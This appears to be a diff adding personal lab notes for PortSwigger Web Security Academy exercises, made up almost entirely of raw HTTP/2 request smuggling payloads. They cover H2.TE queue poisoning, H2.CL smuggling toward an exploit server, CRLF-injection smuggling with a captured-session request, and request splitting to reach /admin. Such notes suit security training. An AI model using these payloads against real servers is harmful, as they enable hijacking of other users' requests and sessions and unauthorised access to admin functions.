@@ -1,0 +1,78 @@
+1- Response queue poisoning via (H2.TE) request smuggling:
+
+(Verify that the vulnerability exists):
+
+POST / HTTP/2\r\n
+Host: 0a0100e203457afc802cd090002300ca.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+Get /HelloWorld HTTP/1.1\r\n
+x-Ignore: x
+--------------------------------------
+POST /HelloWorld HTTP/2
+Host: 0a0100e203457afc802cd090002300ca.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+Get / HTTP/1.1
+Host: 0a0100e203457afc802cd090002300ca.web-security-academy.net
+
+======================================================================================================================================================================
+2- (H2.CL) request smuggling:
+(404)
+POST /resources HTTP/2
+Host: 0a6c006e035cb45281c37ab7009000c9.web-security-academy.net
+Content-Length: 0
+
+SMUGGLED
+--------------------------------------
+POST / HTTP/2
+Host: 0a6c006e035cb45281c37ab7009000c9.web-security-academy.net
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0a10003f03d9b4ca8198792f011500dc.exploit-server.net
+Content-Length: 5
+
+x=1
+======================================================================================================================================================================
+3- HTTP/2 request smuggling via CRLF injection:
+(Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by 
+[bar\r\n
+Transfer-Encoding: chunked])
+
+POST / HTTP/2
+Host: 0a0100e203457afc802cd090002300ca.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+Get /HelloWorld HTTP/1.1
+x-Ignore: x
+--------------------------------------
+POST / HTTP/1.1
+Host: 0abd008a030ee06b80abcbcf00da00b9.web-security-academy.net
+Cookie: session=h4nSDIOhEmtD0M34ppL0FdIfZL1JEAHk;
+Content-Length: 1000
+Content-Type: application/x-www-form-urlencoded
+
+search=hat
+======================================================================================================================================================================
+4-  HTTP/2 request splitting via CRLF injection:
+(Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value,
+[bar\r\n
+Host: 0aca009d0420acce80dc036b00ab0013.web-security-academy.net\r\n
+\r\n
+Get /admin HTTP/1.1])
+
+
+0\r\n
+
+======================================================================================================================================================================
+
